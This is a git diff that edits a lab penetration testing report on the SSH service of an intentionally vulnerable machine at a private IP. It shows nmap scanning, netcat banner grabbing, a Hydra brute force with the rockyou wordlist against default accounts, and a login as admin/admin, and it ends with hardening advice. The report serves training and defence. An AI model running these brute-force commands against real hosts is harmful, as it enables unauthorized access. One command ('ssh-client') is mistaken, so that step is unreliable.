@@ -1,7 +1,7 @@
-Penetration Testing Report – Metasploitable2 (Port 22 - SSH)
+# Penetration Testing Report – (Port 22 - SSH)
 
-1.Test date : 12-06-25
-  Test by : [ me ]
+# 1.Test date : 12-06-25
+  Test by : [ NIKHIL ]
 
 2. Target Information
 - Target IP: 192.168.1.101
@@ -10,52 +10,60 @@ Penetration Testing Report – Metasploitable2 (Port 22 - SSH)
 - Port: 22/tcp
 - Tools Used: Nmap, Hydra, Metasploit, SSH client
 
-3. Reconnaissance
 
-3.1 Nmap Scan
+# 3 Scanning / Reconnaissance
 Command:
+```
 nmap -sV -p 22 192.168.1.101
-
+```
 Output:
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 
 Interpretation:
-The SSH service is running an outdated version (OpenSSH 4.7p1), which may be vulnerable to known issues. No immediate remote exploit is available, but weak password authentication can be tested.
+The SSH service is running an outdated version (OpenSSH 4.7p1), which may be vulnerable to known issues.  
+No immediate remote exploit is available, but weak password authentication can be tested.  
 
-4. Enumeration
+#4. Enumeration
 
-4.1 Banner Grabbing
+**4.1 Banner Grabbing**
 Command:
 nc 192.168.1.101 22
 
 Result:
 SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
 
-4.2 Username Discovery
+**4.2 Username Discovery**
 Possible usernames:
 - root
-- msfadmin
+- admin
 - user
 - postgres
 - service
 
 Gathered from:
-- Metasploitable default users
+- Machine default users
 - /etc/passwd (via other exploits)
 
-5. Exploitation
+**Ecryption Enumrations**
+```
+ ssh-client 192.168.1.101
+```
+It will so the Cryptographic info 
+# 5. Exploitation
 
-5.1 Brute-Force Attack (Hydra)
-Command:
-hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101
+**5.1 Brute-Force Attack (Hydra)**
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.101
+```
 
 Result:
-[22][ssh] host: 192.168.1.101   login: msfadmin   password: msfadmin
+[22][ssh] host: 192.168.1.101   login: admin   password: admin
 
 5.2 Manual SSH Login
 Command:
-ssh msfadmin@192.168.1.101
+ssh admin@192.168.1.101
 
 Result:
 - Successful login
@@ -89,4 +97,6 @@ Persistence:
 
 8. Conclusion
 
-Port 22 (SSH) on 192.168.1.101 was vulnerable due to weak default credentials and lack of brute-force protection. Successful login and privilege escalation to root were achieved using Hydra and default credentials. Hardening SSH and disabling unused accounts are essential to prevent real-world attacks.
+Port 22 (SSH) on 192.168.1.101 was vulnerable due to weak default credentials and lack of brute-force protection.   
+Successful login and privilege escalation to root were achieved using Hydra and default credentials.  
+Hardening SSH and disabling unused accounts are essential to prevent real-world attacks.
